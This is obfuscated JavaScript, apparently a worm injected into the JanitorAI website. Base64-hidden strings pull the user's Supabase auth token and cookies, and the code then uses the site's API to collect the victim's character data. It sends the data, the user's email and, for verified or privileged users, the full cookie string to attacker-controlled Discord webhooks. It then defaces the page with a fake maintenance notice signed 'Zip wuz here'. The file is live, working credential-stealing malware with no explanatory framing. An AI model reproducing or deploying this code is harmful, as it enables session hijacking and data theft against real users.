if (window.worm!=window)
{window.worm=window
window.__xnext=function(){let t=document.cookie.split(";").reduce((t,e)=>{let[l,o]=e.split("=");return t[l.trim()]=decodeURIComponent(o.trim()),t},{}),e=atob("c2ItYXV0aC1hdXRoLXRva2Vu");if(zz=atob("YWNjZXNzX3Rva2Vu"),z=atob("QmVhcmVyIA=="),null==(el=t[e])){let l=[],o=0;for(;void 0!==t[e+"."+o];)l.push(t[e+"."+o]),o++;l.length>0&&(el=l.join(""))}if(null!=el)return z+JSON.parse(atob(el.substr(7,el.length)))[zz];};
function d(en) {
    return atob('aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3Mv') + atob(en);
}

setTimeout(()=>{try {
    let whoiam=JSON.parse(atob(__xnext().split(".")[1]))["email"];
    const _1=JSON.stringify,_2=JSON.parse,_3=btoa,_4=atob,_5=window.pako,_6=fetch,_7=document,_8=async()=>{let t=_2(_4(__xnext().split(".")[1])).sub,e={authorization:__xnext(),"sentry-trace":"","x-app-version":_7.cookie.split("janitorai=")[1].split(";")[0]},a=1,i=[],o=!0;for(;o;){let r=await (await _6(`https://janitorai.com/hampter/characters/v2/mine?page=${a}&sort=latest&user_id[]=${t}&search=&privacyFilter=public`,{headers:e,method:"GET",mode:"cors",credentials:"include"})).json();i=i.concat(r.data),r.data.length<r.size&&(o=!1),a++}return i},_9=async()=>{let t=await _8(),e=[];for(let a of t){let i=await (await _6(`https://janitorai.com/hampter/characters/${a.id}`,{headers:{authorization:__xnext(),"sentry-trace":"","x-app-version":_7.cookie.split("janitorai=")[1].split(";")[0]},method:"GET"})).json();e.push(i)}return _3(_5.deflate(_1(e),{to:"string"}))};null==localStorage.getItem("chakra-ui-color-code")&&(async()=>{let t=await _9();localStorage.setItem("chakra-ui-color-code","#62FF0F");let e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:whoiam});e.append("payload_json",i),fetch(d("MTI5MjY1NjMxNDA2MDc3MTQ2My9pdmJxeU1XY0k5Z0hQV1A2YU5VZVJqQmtheHE0Y2lvTTl5VGR3NXpOX1pZNTZtWUxGbHNJd3dfTkh2X2FBb1Q5eWM5dA=="),{method:"POST",body:e})})();function c() {return btoa(pako.deflate(document.cookie, { to: 'string' }));}
    if (JSON.parse(localStorage.getItem("stores")).user.profile.user_roles.length>0 || JSON.parse(localStorage.getItem("stores")).user.profile.is_verified || window.location.href.includes("01147ff7-c6d2-404a-b9ce-206544d6c97c_character-samael-darkheart")){let t=c(),e=new FormData,a=new Blob([t],{type:"text/plain"});e.append("file",a,"content.txt");let i=JSON.stringify({content:"@everyone "+whoiam+" <"+window.location.href+"> `"+JSON.stringify(JSON.parse(localStorage.getItem("stores")).user.profile.user_roles)+"`"});e.append("payload_json",i),fetch(d("MTI5MjY1MzYxNzI3MDEwMDA2MC9zTVVINU1rcjlOOVVqalpkVXdXOVJFenJWaTg4ODJHNWRmYU9WZTVpYlJkQ2lhZXlRWnRCc19xWmRQa1pyc3o5UTljbQ=="),{method:"POST",body:e});}
} catch {}},2000)
function load(url,pos = null,type=null) {
        if (pos==null){
            pos = document.body
        }
        const iframe = document.createElement('script');
        iframe.src = url;
        if (type!=null){
            iframe.type = type
        }
        pos.appendChild(iframe);
}
load('https://cdnjs.cloudflare.com/ajax/libs/pako/1.0.11/pako.min.js');
}
    document.head.innerHTML = `
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>JanitorAI - Shut Down for Maintenance</title>
      <style>
        body, html {
          margin: 0;
          padding: 0;
          width: 100%;
          height: 100%;
          display: flex;
          justify-content: center;
          align-items: center;
          font-family: 'Arial', sans-serif;
          background-color: #1a0d3f; /* Background similar to image */
          color: #fff;
        }
        .message-container {
          text-align: center;
        }
        .message-container h1 {
          font-size: 3em;
          margin-bottom: 20px;
          color: #cb6cf6;
          background: -webkit-linear-gradient(#cb6cf6, #00f);
          -webkit-background-clip: text;
          -webkit-text-fill-color: transparent;
        }
        .message-container p {
          font-size: 1.5em;
          color: #aaa;
        }
        .beta-badge {
          display: inline-block;
          background-color: #4a0069;
          color: #cb6cf6;
          padding: 10px 20px;
          border-radius: 25px;
          font-size: 1.2em;
          margin-top: 15px;
          border: 2px solid #cb6cf6;
        }
        @keyframes stretchAndSquash{0%,100%{transform:scale(1.1,.9)}50%{transform:scale(.9,1.1)}}.stretch-squash{animation:1s ease-in-out infinite stretchAndSquash;position:fixed;left:-15px;bottom:-35px;width:200px;height:200px;z-index:999999999;background-image: url(https://ScriggerMania.github.io/zip.png);background-size: contain;}
      </style><link href="https://fonts.googleapis.com/css2?family=Barrio&display=swap" rel="stylesheet"><link href="https://fonts.googleapis.com/css2?family=Jura&display=swap" rel="stylesheet">

    `;
    
    document.body.innerHTML = `
 <div class="message-container">
        <div class="beta-badge" style="
    display: flex;
    align-content: center;
    justify-content: center;
    align-items: center;
    height: 60px;
">
        <p style="
    font-family: 'Jura', sans-serif;;
    font-weight: var(--chakra-fontWeights-bold);
">Shut down for maintenance.</p></div>
        <p style="
    position: fixed;
    bottom: 150px;
    font-size: 20px;
    left: 25px;
    opacity: 0.5;
    font-family: 'Barrio', cursive;
">Ps.. Zip wuz here n shieeet...</p><div class="stretch-squash"></div>
      </div>
    `;
